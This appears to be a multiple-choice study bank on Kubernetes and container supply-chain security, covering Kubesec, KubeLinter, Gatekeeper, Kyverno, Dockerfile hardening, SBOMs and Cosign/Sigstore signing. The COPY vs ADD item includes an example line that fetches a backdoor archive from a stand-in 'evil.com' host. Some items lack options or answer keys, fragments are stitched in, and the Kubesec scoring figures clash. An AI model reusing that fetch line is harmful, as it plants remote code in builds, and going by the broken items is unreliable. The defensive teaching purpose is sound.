What are Kubesec and KubeLinter — how do they perform static analysis of Kubernetes manifests?
A) Both are runtime security tools that monitor running pods
B) Kubesec is a CNI plugin; KubeLinter is a storage driver
C) They are identical tools with different brand names — both do the same thing
D) Kubesec: Static analysis that scores manifests on a risk scale (0-10). Checks for: privileged containers, readOnlyRoot, capabilities, runAsNonRoot, resource limits. KubeLinter: Best-practice linter that checks YAML against a configurable set of rules. Both run BEFORE deployment (shift-left security) and can be integrated into CI/CD to BLOCK PRs with insecure configs
✅ Correct Answer: D

Shift-left security: catch misconfigurations before they reach the cluster. A CI/CD pipeline that runs Kubesec + KubeLinter + Trivy on every PR prevents insecure manifests from ever being deployed.

📝 Detailed Explanation
Shift-Left Security — Static Analysis in CI/CD
  ┌──────────────────────────────────────────────────────────────────┐
  │  CI/CD PIPELINE — SHIFT-LEFT SECURITY:                             │
  │                                                                   │
  │  Developer pushes YAML to Git                                      │
  │       │                                                           │
  │       ▼                                                           │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ STEP 1: KUBESEC (risk scoring)                               │ │
  │  │ ┌─────────────────────────────────────────────────────────┐ │ │
  │  │ │ kubesec scan deployment.yaml                              │ │ │
  │  │ │                                                           │ │ │
  │  │ │ Score: 3/10 ⚠️ FAILED                                      │ │ │
  │  │ │   Critical:                                                │ │ │
  │  │ │   • container is privileged (score 0)                      │ │ │
  │  │ │   • runAsNonRoot not set (score 0)                         │ │ │
  │  │ │   • readOnlyRootFilesystem not set (score 0)              │ │ │
  │  │ │   Warning:                                                 │ │ │
  │  │ │   • no resource limits (score -2)                          │ │ │
  │  │ │   • capabilities not dropped to minimal (score -1)         │ │ │
  │  │ └─────────────────────────────────────────────────────────┘ │ │
  │  ├─────────────────────────────────────────────────────────────┤ │
  │  │ STEP 2: KUBELINTER (best-practice checks)                   │ │
  │  │ ┌─────────────────────────────────────────────────────────┐ │ │
  │  │ │ lint-check deployment.yaml                                │ │ │
  │  │ │                                                           │ │ │
  │  │ │ ❌ no-read-only-root-fs — container has writable root     │ │ │
  │  │ │ ❌ run-as-non-root — running as root (UID 0)              │ │ │
  │  │ │ ❌ drop-capabilities — ALL capabilities not dropped       │ │ │
  │  │ │ ❌ no-rolling-update-strategy — using Recreate            │ │ │
  │  │ └─────────────────────────────────────────────────────────┘ │ │
  │  ├─────────────────────────────────────────────────────────────┤ │
  │  │ STEP 3: TRIVY (vulnerability scanning)                      │ │
  │  │   trivy image anihpj-api:v1                                  │ │
  │  │   → Blocks if CRITICAL CVEs found                            │ │
  │  ├─────────────────────────────────────────────────────────────┤ │
  │  │ RESULT: PR BLOCKED — developer must fix before merge         │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘
Microservice Vulns Q119 of 200
Write an OPA/Gatekeeper policy that requires all pods to have a specific label and restricts image registries.
A) OPA policies are written in YAML — just like Kubernetes manifests
B) A ConstraintTemplate defines the Rego logic for checking labels/images, and a Constraint specifies parameters (required label "app.kubernetes.io/name", allowed registry "my-registry.io"). The Rego rule evaluates input.review.object and returns violations if labels are missing or images come from disallowed registries. This is enforced by the validating admission webhook
C) OPA policies are applied via kubectl label on namespaces — similar to PSA
D) OPA cannot restrict image registries — that requires a separate ImagePolicyWebhook
✅ Correct Answer: B

OPA/Gatekeeper's power is in the separation: ConstraintTemplate defines "HOW to check," Constraint defines "WHAT to check for." This allows platform teams to define templates and app teams to create constraints with their specific parameters.

📝 Detailed Explanation
OPA/Gatekeeper — Label + Registry Enforcement
  ┌──────────────────────────────────────────────────────────────────┐
  │  CONSTRAINT TEMPLATE: "K8sRequiredLabelsAndRegistry"              │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ Rego snippet (conceptual):                                   │ │
  │  │                                                              │ │
  │  │ # Check labels                                               │ │
  │  │ violation[{"msg": msg}] {                                    │ │
  │  │   required := input.parameters.labels                        │ │
  │  │   provided := object.metadata.labels                         │ │
  │  │   missing := required - provided                             │ │
  │  │   count(missing) > 0                                         │ │
  │  │   msg := sprintf("Missing labels: %v", [missing])            │ │
  │  │ }                                                            │ │
  │  │                                                              │ │
  │  │ # Check image registry                                       │ │
  │  │ violation[{"msg": msg}] {                                    │ │
  │  │   containers := object.spec.containers                       │ │
  │  │   allowed := input.parameters.allowedRegistries              │ │
  │  │   some c in containers                                       │ │
  │  │   not startswith(c.image, allowed[_])                        │ │
  │  │   msg := sprintf("Disallowed registry: %v", [c.image])       │ │
  │  │ }                                                            │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │       │                                                           │
  │       ▼  Instantiated as                                          │
  │                                                                   │
  │  CONSTRAINT: "anihpj-image-policy"                                │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ parameters:                                                  │ │
  │  │   labels:                                                    │ │
  │  │     - "app.kubernetes.io/name"                               │ │
  │  │     - "app.kubernetes.io/owner"                              │ │
  │  │   allowedRegistries:                                         │ │
  │  │     - "acr.anihpj.io"                                        │ │
  │  │     - "docker.io/anihpj"                                     │ │
  │  │                                                              │ │
  │  │  RESULT:                                                      │ │
  │  │  ✅ anihpj-api from acr.anihpj.io (has labels) → ALLOWED     │ │
  │  │  ❌ nginx:latest from docker.io (no anihpj labels) → DENIED  │ │
  │  │  ❌ anihpj-api from quay.io/unknown (bad registry) → DENIED  │ │

How does Kyverno's mutate rule automatically add default securityContext to pods?
A) Kyverno sends alerts to developers asking them to fix their manifests manually
B) Kyverno only works on Deployments — it cannot mutate individual Pods
C) A Kyverno ClusterPolicy with a mutate rule targets pods (kind: Deployment) and uses patchesJson6902 or patchStrategicMerge to add fields. Example: add runAsNonRoot: true, drop: [ALL] capabilities, and readOnlyRootFilesystem: true to every pod that doesn't explicitly set them. Kyverno's killer feature: automatic security remediation. Developers push a pod without securityContext — Kyverno FIXES it, and the API server sees the hardened pod. Zero friction. This is how you scale security across large organizations.

Why does a distroless base image have 97% fewer CVEs than ubuntu:latest, and why does this matter for Kubernetes security?
A) Distroless images are smaller so scanners skip them — it's a false sense of security
B) Distroless images contain ONLY the application and its runtime dependencies — NO shell, NO package manager, NO system utilities. Fewer packages = fewer CVEs. ubuntu:latest includes bash, apt, curl, and hundreds of packages you don't need. Attackers can't exploit what isn't there — distroless eliminates the "living off the land" attack where attackers use built-in tools (curl, wget, bash) to download malware or pivot laterally
C) Distroless images use a different package format that scanners don't recognize — the CVEs still exist
D) ubuntu:latest is actually safer because Canonical patches CVEs faster than Google maintains distroless

Distroless = "just enough OS." If there's no shell, attackers can't `kubectl exec` into your pod and run commands. If there's no package manager, they can't install tools. This is defense-in-depth through minimalism.

Supply Chain Q122 of 200
How do multi-stage Docker builds reduce the attack surface of production images?
A) Multi-stage builds concatenate all layers into one — reducing image size but not security
B) Multi-stage builds are purely cosmetic — they organize the Dockerfile but don't change the final image
C) Stage 1 (builder) contains compilers, dev headers, git, and build tools. Stage 2 (production) copies ONLY the compiled binary or runtime. The final image has NO compilers, NO source code, NO git history, NO dev dependencies. Attackers who compromise the running container can't recompile or analyze source — there's nothing to work with
D) Multi-stage builds require running two containers — doubling the attack surface
✅ Correct Answer: C

Multi-stage = build in a bloated container, run in a minimal one. The build stage has gcc, pip, git — all attack vectors. The production stage has only the compiled app. Compromise the production container and there's nothing to use.

📝 Detailed Explanation
Multi-Stage Build — anihpj Django Example
  ┌──────────────────────────────────────────────────────────────────┐
  │  # Stage 1: BUILDER (big, has tools, THROWN AWAY)                 │
  │  FROM python:3.11 AS builder                                      │
  │  RUN pip install --user -r requirements.txt  ← has pip, gcc, git  │
  │  COPY . /app                                                      │
  │                                                                    │
  │  # Stage 2: PRODUCTION (slim, no tools, WHAT SHIPS)               │
  │  FROM gcr.io/distroless/python3                                   │
  │  COPY --from=builder /root/.local /root/.local  ← ONLY runtime    │
  │  COPY --from=builder /app /app                                    │
  │  USER 1000                                                        │
  │  CMD ["/app/manage.py", "runserver"]                              │
  │                                                                    │
  │  FINAL IMAGE: No pip, no gcc, no git — just Python + your app.    │
  │  An attacker can't pip install backdoors.                         │
  └──────────────────────────────────────────────────────────────────┘

Why is USER 1000 in Dockerfile critical, and what happens if you omit it?

B) Without USER, the container runs as ROOT (UID 0). If an attacker escapes the container (or exploits the app), they get root on the host node — full node compromise. This is defense-in-depth: Dockerfile USER + K8s securityContext = two layers of protection

Supply Chain Q126 of 200
Dockerfile: COPY vs ADD — which is more secure and why?
A) ADD is deprecated — it's the same as COPY but with a different name
B) ADD is more secure because it validates URLs before downloading files
C) COPY only copies files from the build context (local directory). ADD can ALSO: fetch URLs (curl-like) AND auto-extract tar archives. The problem: ADD fetching a URL means your Docker build downloads remote content — a compromised URL could inject malware. ADD auto-extracting tar means a malicious tar could overwrite system files. Docker best practice: use COPY unless you explicitly need tar auto-extraction
D) COPY and ADD are identical — the Docker team just added both for backwards compatibility
✅ Correct Answer: C

COPY = safe, predictable, local-only. ADD = powerful, dangerous, downloads from internet. The Docker best practice guide explicitly says: "Prefer COPY over ADD." For anihpj, always use COPY.

📝 Detailed Explanation

  │  │ → Copies from LOCAL build context ONLY                        │ │
  │  │ → No network, no extraction, no surprises                     │ │
  │  │ → Deterministic: same context = same result                   │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  ADD (DANGEROUS):                                                 │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ ADD https://evil.com/backdoor.tar.gz /app/                    │ │
  │  │ → Fetches from ANY URL (like curl)                            │ │
  │  │ → Auto-extracts tar.gz → files placed in /app/               │ │
  │  │ → Could overwrite /app/manage.py with backdoor!              │ │
  │  │ → Non-deterministic: same Dockerfile ≠ same result            │ │
  │  │                                                               │ │
  │  │ ADD myapp.tar.gz /app/  ← LEGIT use case: tar auto-extract   │ │
  │  │ (But even this: COPY + RUN tar is more explicit)             │ │

What is .dockerignore and why is it a security-critical file?
A) .dockerignore is only for performance — it skips large files to speed up builds
B) .dockerignore is deprecated — use multi-stage builds instead
C) .dockerignore only affects the docker build output — it doesn't impact security
D) .dockerignore prevents sensitive files from being sent to the Docker daemon as build context. Without it, files like .env, secrets.yaml, .git/config, id_rsa, and credentials.json get COPIED INTO THE IMAGE LAYER. .dockerignore is your first line of defense against credential leaks. Even if you never COPY the .env file, if it's in the build context, ALL files are sent to the daemon. A compromised daemon = leaked secrets.

What is BuildKit secret mounting (--mount=type=secret) and how does it prevent secrets in image layers?
A) BuildKit's RUN --mount=type=secret,id=gh_token mounts a secret file ONLY during that RUN command — the secret is NEVER stored in any image layer. After the RUN completes, the secret is unmounted and gone. This replaces the old pattern of COPY token /tmp && use-it && rm /tmp/token — which LEAKS the token in the COPY layer (visible via docker history). BuildKit secrets are the ONLY safe way to use secrets during builds
B) BuildKit secret mounting encrypts the secret and stores it in the final image layer — it's just obfuscation
C) BuildKit is a third-party tool — Docker doesn't support secret mounting natively
D) Secret mounting only works with Docker Swarm — it's not available in standalone Docker builds
✅ Correct Answer: A

BuildKit secret mounts are the CORRECT way to use secrets in builds. The old pattern (COPY + rm) leaks secrets in intermediate layers. Always use DOCKER_BUILDKIT=1 docker build with --secret for any build that needs credentials.

📝 Detailed Explanation
BuildKit Secrets — The Safe Way
  ┌──────────────────────────────────────────────────────────────────┐
  │  OLD WAY (INSECURE — secret leaks in layer):                      │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ COPY gh_token /tmp/token       ← LAYER 3: token visible!    │ │
  │  │ RUN pip install -r requirements.txt --token $(cat /tmp/token)│ │
  │  │ RUN rm /tmp/token              ← LAYER 5: token "deleted"   │ │
  │  │                                                                │ │
  │  │ $ docker history image → LAYER 3 shows /tmp/token ADDED      │ │
  │  │ $ docker save image | tar x → token extracted from LAYER 3!  │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  BUILDKIT WAY (SECURE — secret never in layer):                    │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ # syntax=docker/dockerfile:1                                  │ │
  │  │ RUN --mount=type=secret,id=gh_token \                         │ │
  │  │     pip install -r requirements.txt \                         │ │
  │  │     --token $(cat /run/secrets/gh_token)                      │ │
  │  │                                                                │ │
  │  │ $ DOCKER_BUILDKIT=1 docker build \                             │ │
  │  │     --secret id=gh_token,src=./token.txt .                     │ │
  │  │                                                                │ │
  │  │ $ docker history image → NO trace of secret!                  │ │
  │  │ $ docker save image | tar x → NO secret in any layer!         │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

What is an SBOM (Software Bill of Materials) and why is it essential for Kubernetes supply chain security?
A) SBOM is a marketing checklist — it doesn't improve security, just satisfies auditors
B) An SBOM is a machine-readable INVENTORY of ALL components in your image: base OS packages, language dependencies, transitive dependencies, and their versions. It's like a nutrition label for your container. Without an SBOM, when Log4Shell (CVE-2021-44228) is announced, you have NO idea which of your 200 running pods contain the vulnerable Log4j version. C) SBOM is a Kubernetes-native resource type — you create it with kubectl
D) SBOMs are only required for US federal government projects — they're not relevant for most organizations
✅ Correct Answer: B

SBOM = your ingredient list. When a zero-day drops, you don't scan images — you query SBOMs. This is the difference between "we need 3 days to audit all images" and "we know in 30 seconds." Executive Order 14028 mandates SBOMs for US federal software.

What are the main SBOM formats (SPDX, CycloneDX) and which tool generates them?
A) SBOMs are Excel spreadsheets — there are no standard formats
B) SPDX and CycloneDX are competing container runtimes — they have nothing to do with SBOMs
C) SPDX (Software Package Data Exchange): Linux Foundation standard, JSON/YAML/tag-value. CycloneDX: OWASP standard, XML/JSON, originated from OWASP Dependency-Track. Syft (Anchore): generates BOTH formats from container images. Trivy: also generates CycloneDX SBOMs. Both are OSS and widely adopted

How does GitOps (Argo CD / Flux) improve supply chain security over push-based deployment?
A) GitOps is just a different way to run kubectl — no security difference
B) GitOps uses PULL-based deployment: the cluster operator (Argo CD) runs INSIDE the cluster and pulls from Git. This means: (1) No CI/CD system needs cluster credentials (cluster-admin tokens). (2) Git is the single source of truth — what's in Git IS what's deployed — immutable audit trail. (3) Drift detection: Argo CD continuously reconciles — if someone manually changes a deployment, it auto-reverts. (4) Every change has a git commit with author, timestamp, and approval
C) GitOps requires storing Kubernetes Secrets in Git — making them more accessible

✅ Correct Answer: B

GitOps = no cluster credentials in CI. The CI pushes to Git, and Argo CD (inside the cluster) pulls from Git. This eliminates the massive risk of CI systems holding cluster-admin credentials.

Supply Chain Q136 of 200
What is pipeline drift detection and how does it protect the supply chain?
A) Drift detection is about network latency — it measures how far packets drift in transit
B) Drift detection only applies to Node.js dependencies — it checks npm package versions
C) Drift detection is a Kubernetes audit log feature — it has nothing to do with supply chains
D) Drift detection compares "what is running" vs "what was deployed." Argo CD detects drift by continuously reconciling the live cluster state against the Git desired state. If someone manually edits a Deployment (kubectl edit), Argo CD detects the drift and auto-reverts OR alerts. This prevents "shadow ops" — changes made outside the approved GitOps pipeline that bypass security reviews
✅ Correct Answer: D

Drift detection = "Did someone bypass the pipeline?" If a production change doesn't match Git, someone either made a manual change (shadow ops) or the system is compromised. Either way, you need to know. Argo CD auto-heals drift by default.

📝 Detailed Explanation
Argo CD Drift Detection — Git vs Live State
  ┌──────────────────────────────────────────────────────────────────┐
  │  DESIRED STATE (Git):                  LIVE STATE (Cluster):      │
  │  ┌────────────────────────────┐        ┌──────────────────────┐  │
  │  │ replicas: 3                 │        │ replicas: 5 ← DRIFT! │  │
  │  │ image: anihpj-api:v2.1.0   │        │ image: anihpj-api:v2 │  │
  │  │ resources:                  │        │ resources: removed   │  │
  │  │   limits: {cpu:500m}       │        │                      │  │
  │  └────────────────────────────┘        └──────────────────────┘  │
  │                                                                   │
  │  ARGO CD RESPONSE:                                                │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ 1. Compares Git (desired) vs Cluster (live) every 3 min     │ │
  │  │ 2. Detects: replicas=5 ≠ desired replicas=3                 │ │
  │  │ 3. Auto-Sync: scales down to 3 replicas                     │ │
  │  │ 4. Drift = "someone manually changed the Deployment"        │ │
  │  │ 5. Security alert: shadow ops OR compromised credentials    │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  WITH GITOPS: Every change requires a git commit + PR review.     │
  │  Manual kubectl edits are undone automatically.                   │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost, Argo CD ensures the production state ALWAYS matches the reviewed, approved Git configuration. Any manual kubectl edit is automatically reverted within 3 minutes — preventing shadow ops and unauthorized changes that bypass security review.

Supply Chain Q137 of 200
How does Docker layer caching order affect both build performance AND security?
A) Order matters: COPY requirements.txt . BEFORE COPY . .. Docker caches layers by checksum. If requirements.txt hasn't changed, the RUN pip install layer is cached (fast). If you COPY . first and ANY file changes, the ENTIRE cache invalidates (slow). Security: caching the pip install layer means dependencies are pinned and consistent — no accidental upgrades that introduce new CVEs. Correct order: COPY package files → RUN install → COPY app code
B) Layer caching order has no effect on security — it's purely a performance optimization
C) Docker caches are insecure and should be disabled in production builds
D) The order should be: COPY app code first, then install dependencies — so the app can modify them
✅ Correct Answer: A

Layer ordering = performance + security. Pinning dependency installation in its own layer ensures reproducibility — the same requirements.txt always produces the same dependencies. No drift, no surprise upgrades introducing CVEs.

📝 Detailed Explanation
Docker Layer Caching — Correct vs Incorrect Order
  ┌──────────────────────────────────────────────────────────────────┐
  │  ❌ WRONG ORDER (cache breaks on any code change):                │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ COPY . .                    ← LAYER 3: changes every commit │ │
  │  │ RUN pip install -r req.txt  ← LAYER 4: MUST reinstall!     │ │
  │  │                                                               │ │
  │  │ Result: Every code change = full pip install = slow          │ │
  │  │ Security: pip may pull NEWER versions → new CVEs!           │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  ✅ CORRECT ORDER (cache hits on code changes):                    │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ COPY requirements.txt .     ← LAYER 3: only changes when     │ │
  │  │ RUN pip install -r req.txt  ← LAYER 4: CACHED 99% of time!  │ │
  │  │ COPY . .                    ← LAYER 5: app code (changes)   │ │
  │  │                                                               │ │
  │  │ Result: Code changes only rebuild LAYER 5 = fast            │ │
  │  │ Security: Dependencies FROZEN in cached layer = reproducible │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  FOR ANIHPJ: COPY requirements.txt → RUN pip install → COPY .    │
  │  Ensures Django 4.2.0 stays Django 4.2.0 until requirements.txt   │
  │  is explicitly updated and reviewed. No surprise CVE upgrades.    │
  └──────────────────────────────────────────────────────────────────┘

This pattern is a security control disguised as a performance optimization. By freezing dependencies in a cached layer, you prevent dependency drift — a common source of unexpected CVEs in production images.

B) Image signing cryptographically proves: (1) The image was built by the authorized publisher (not an impostor). (2) The image has NOT been tampered with since signing (integrity). Supply Chain Q140 of 200
What is Cosign and how does it sign container images using Sigstore?
A) Cosign is a Kubernetes admission controller — it runs inside the cluster
B) Cosign requires running your own PKI infrastructure with key rotation and management
C) Cosign is a Docker plugin — it modifies the Docker daemon to sign every pushed image
D) Cosign is a CLI tool that signs container images and stores signatures in the OCI registry alongside the image. It supports: (1) Key-based signing (generate key pair with cosign generate-key-pair). (2) KEYLESS signing via OIDC (sign with your GitHub/Google/Microsoft identity — NO key management!). (3) Hardware token signing. Cosign stores signatures as OCI artifacts in the same repo as the image
✅ Correct Answer: D

Cosign is the standard for signing container images in the cloud-native ecosystem. Keyless signing (via Sigstore) is the killer feature — no keys to manage, rotate, or lose. Your GitHub identity IS your signing key.

📝 Detailed Explanation
Cosign — Signing Workflow
  ┌──────────────────────────────────────────────────────────────────┐
  │  KEY-BASED SIGNING:                                               │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ $ cosign generate-key-pair                                   │ │
  │  │   → cosign.key (private, KEEP SAFE)                          │ │
  │  │   → cosign.pub  (public, share widely)                       │ │
  │  │                                                               │ │
  │  │ $ cosign sign --key cosign.key anihpj-api:v2                 │ │
  │  │   → Signature pushed to registry as OCI artifact             │ │
  │  │                                                               │ │
  │  │ $ cosign verify --key cosign.pub anihpj-api:v2               │ │
  │  │   ✅ Verification passed                                      │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  KEYLESS SIGNING (Sigstore):                                       │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ $ cosign sign anihpj-api:v2                                  │ │
  │  │   → Opens browser → sign in with GitHub OIDC                 │ │
  │  │   → Fulcio issues short-lived certificate                    │ │

What are the three components of the Sigstore ecosystem: Fulcio, Rekor, and Cosign?
A) Fulcio: Certificate Authority that issues short-lived (10 min) code-signing certificates based on OIDC identity. Rekor: Immutable transparency log (like Certificate Transparency for images) — records every signing event so anyone can verify "this image was signed at this time by this identity." Cosign: CLI tool that performs the signing/verification using Fulcio+Rekor. Together they enable keyless signing with public auditability
B) These are three competing image signing tools — you pick one
C) Fulcio is a registry, Rekor is a scanner, Cosign is a CI/CD platform
D) Sigstore is only for Google Cloud — it doesn't work with other registries
✅ Correct Answer: A

Sigstore = free, open-source, keyless signing for everyone. Fulcio gives you the cert, Rekor records the proof, Cosign does the work. The transparency log (Rekor) means attacks can't be hidden — every signature is public and auditable.

📝 Detailed Explanation
Sigstore Ecosystem — How Keyless Signing Works
  ┌──────────────────────────────────────────────────────────────────┐
  │  SIGNING FLOW:                                                    │
  │                                                                   │
  │  1. Developer: cosign sign anihpj-api:v2                          │
  │       │                                                           │
  │       ▼                                                           │
  │  2. OIDC: Login with GitHub/Google/Microsoft                      │
  │       │  → Get ID token: "I am anihpj-bot@github.com"            │
  │       ▼                                                           │
  │  3. FULCIO (CA): Verifies OIDC token                              │
  │       │  → Issues SHORT-LIVED cert (10 min!)                      │
  │       │  → Bound to identity: anihpj-bot@github.com               │
  │       ▼                                                           │
  │  4. REKOR (Transparency Log): Records signing event                │
  │       │  → Immutable, append-only log                             │
  │       │  → Anyone can verify: "Was this image signed?"           │
  │       │  → Prevents "hide the signing" attacks                    │
  │       ▼                                                           │
  │  5. REGISTRY: Signature stored as OCI artifact                    │
  │                                                                   │
  │  VERIFICATION: cosign verify anihpj-api:v2                        │
  │  → Checks Fulcio cert → Checks Rekor log → Validates signature   │
  └──────────────────────────────────────────────────────────────────┘
Supply Chain Q142 of 200
What is keyless signing and why is it more secure than managing your own private keys?
A) Keyless signing means no signatures — it's less secure but easier to implement
B) Keyless signing stores private keys in the cloud — it's just managed PKI
C) Keyless signing uses OIDC identity (GitHub/Google account) + Fulcio short-lived certificates. NO private keys to generate, store, rotate, or lose. The certificate expires in 10 minutes — even if stolen, it's useless. Traditional signing: lose your private key = attacker can sign as you FOREVER. Keyless: there IS no long-lived key to lose. This eliminates the #1 operational failure of PKI: key management
D) Keyless signing is a Docker Desktop feature — it only works locally
✅ Correct Answer: C

Keyless = no keys to manage, rotate, or lose. The #1 reason companies don't sign images is "key management is too hard." Sigstore solves this. Your GitHub identity is the signing credential; Fulcio certs are short-lived (10 min) and bound to that identity.

📝 Detailed Explanation
Keyless vs Key-Based — The Key Management Problem
  ┌──────────────────────────────────────────────────────────────────┐
  │  KEY-BASED (TRADITIONAL):                                         │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ ✅ Generate key: cosign generate-key-pair                     │ │
  │  │ ❌ Store key securely: Where? Vault? KMS? Encrypted file?    │ │
  │  │ ❌ Rotate key: Every 90 days? Who does it?                   │ │
  │  │ ❌ Revoke if compromised: How do you know? Who revokes?      │ │
  │  │ ❌ Share with team: How do 5 devs sign? Share key? (NO!)     │ │
  │  │ ❌ Key lost = CAN'T SIGN until new key → verification breaks │ │
  │  │ ❌ Key stolen = attacker signs as you FOREVER                 │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  KEYLESS (SIGSTORE):                                              │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ ✅ Sign with OIDC: cosign sign image                         │ │
  │  │ ✅ Identity = signing key: anihpj-bot@github.com             │ │
  │  │ ✅ No key to store → identity is managed by GitHub/Google    │ │
  │  │ ✅ No key rotation → fresh cert per signature                │ │
  │  │ ✅ Cert expires in 10 min → stolen cert is USELESS           │ │
  │  │ ✅ No key sharing → each dev uses their own identity         │ │
  │  │ ✅ Recorded in Rekor → public, auditable, immutable          │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

How do you verify a Cosign signature before deploying an image to Kubernetes?
A) Image signatures are automatically verified by Kubernetes — no action needed
B) You check the "verified publisher" badge on Docker Hub — that's sufficient
C) Signature verification is a one-time setup — you run it once and forget about it
D) cosign verify --certificate-identity anihpj-bot@github.com anihpj-api:v2 checks: (1) The signature is cryptographically valid for this image digest. For Kubernetes: use an admission controller (Kyverno, OPA/Gatekeeper, or Sigstore Policy Controller) to enforce verification on every pod creation
✅ Correct Answer: D

📝 Detailed Explanation
Cosign Verification — CLI + Admission Controller
  ┌──────────────────────────────────────────────────────────────────┐
  │  STEP 1: MANUAL VERIFICATION (CLI)                                │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ $ cosign verify --certificate-identity \                      │ │
  │  │     anihpj-bot@github.com anihpj-api:v2                       │ │
  │  │                                                                │ │
  │  │ Verification for anihpj-api:v2 —                               │ │
  │  │ ✅ The signature is valid (crypto check passed)               │ │
  │  │ ✅ Certificate issued by Fulcio (trusted CA)                  │ │
  │  │ ✅ Certificate identity: anihpj-bot@github.com                │ │
  │  │ ✅ Entry found in Rekor transparency log                      │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  STEP 2: AUTOMATED ENFORCEMENT (Kyverno admission controller)     │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ Kyverno ClusterPolicy: "verify-cosign-signature"             │ │
  │  │ → Runs cosign verify on EVERY pod creation                   │ │
  │  │ → Image anihpj-api@sha256:abc → verify → ALLOW               │ │
  │  │ → Image unknown/app:latest → verify fails → DENY             │ │
  │  │                                                                │ │
  │  │ RESULT: Only verifiably signed images can run.               │ │
  │  │ No manual check needed — machine verifies every deploy.      │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

Manual verification is a sanity check. Automated enforcement is security. Kyverno's verifyImages rule runs Cosign verification at admission time — every pod creation must pass signature validation or it's rejected.

📝 Detailed Explanation
ImagePolicyWebhook — Admission Flow
  ┌──────────────────────────────────────────────────────────────────┐
  │  API SERVER CONFIGURATION:                                        │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ kube-apiserver \                                              │ │
  │  │   --enable-admission-plugins=...,ImagePolicyWebhook \         │ │
  │  │   --admission-control-config-file=/etc/kubernetes/adm.yaml   │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  POD CREATION → IMAGE VALIDATION:                                  │
  │  ┌──────────┐   ImageReview{image:"anihpj-api:v2"}  ┌─────────┐  │
  │  │ API      │──────────────────────────────────────▶│ Webhook │  │
  │  │ Server   │◀──────────────────────────────────────│ Server  │  │
  │  └──────────┘   {allowed:true, reason:"signed"}    └─────────┘  │
  │       │                                              │           │
  │       │  ┌──────────────────────────────────────────┘           │
  │       ▼  ▼                                                       │
  │  Webhook checks:                                                  │
  │  1. Is image from allowed registry? (acr.anihpj.io)              │
  │  2. Is image signed by authorized identity? (Cosign verify)      │
  │  3. Does image pass vulnerability policy? (no CRITICAL CVEs)     │
  │  → ALL must pass → ALLOW                                         │
  │  → ANY fails → DENY (pod creation blocked)                       │
  └──────────────────────────────────────────────────────────────────┘

The ImagePolicyWebhook is the integration point — it connects the API server to your image policy engine (Cosign, Binary Auth, custom). It's the LAST checkpoint before an image becomes a running pod.

How does Kubesec perform static risk scoring for Kubernetes manifests?
A) Kubesec assigns a 0-10 risk score to Kubernetes YAML manifests. It checks: privileged containers (-30 pts), runAsNonRoot (-30 pts if unset), readOnlyRootFilesystem (-30 pts), capabilities (ALL dropped = +1, no drop = -5), resource limits (-2), seccomp/AppArmor profiles. Score 0-3 = CRITICAL (BLOCK), 4-6 = WARNING, 7+ = GOOD. Run in CI: kubesec scan deployment.yaml and fail if score < 5
B) Kubesec is a runtime scanner — it monitors running pods, not YAML files
C) Kubesec requires a Kubernetes cluster to run — it can't be used in CI/CD
D) Kubesec is a network security tool — it has nothing to do with YAML manifests
✅ Correct Answer: A

Kubesec = "how secure is this YAML manifest?" before it goes to production. Run in CI and block deployments scoring below your threshold. Pair with KubeLinter for best-practice checks and Trivy for CVEs.

📝 Detailed Explanation
Kubesec — YAML Risk Scoring
  ┌──────────────────────────────────────────────────────────────────┐
  │  $ kubesec scan deployment.yaml                                   │
  │                                                                   │
  │  SCORE: 3/10 ⚠️ CRITICAL                                         │
  │  ┌─────────────────────────────────────────────────────────────┐ │
  │  │ CRITICAL:                                                     │ │
  │  │   • privileged: true             → -30 pts                   │ │
  │  │   • runAsNonRoot: not set        → -30 pts                   │ │
  │  │   • readOnlyRootFilesystem: false → -20 pts                  │ │
  │  │                                                               │ │
  │  │ WARNING:                                                      │ │
  │  │   • resources.limits: not set    → -2 pts                    │ │
  │  │   • capabilities.drop: not ALL   → -1 pts                    │ │
  │  │                                                               │ │
  │  │ ADVICE:                                                        │ │
  │  │   1. Set privileged: false                                    │ │
  │  │   2. Add runAsNonRoot: true to securityContext                │ │
  │  │   3. Add readOnlyRootFilesystem: true                         │ │
  │  │   4. Add resource limits                                      │ │
  │  └─────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  CI GATE: kubesec scan deploy.yaml | jq '.[].score > 7'          │
  └──────────────────────────────────────────────────────────────────┘

What do CVE severity levels (Critical, High, Medium, Low) mean and how should you triage them?
A) All CVEs must be fixed immediately — there is no triage process for container security
B) Severity levels are arbitrary — a Low CVE can be as dangerous as a Critical one
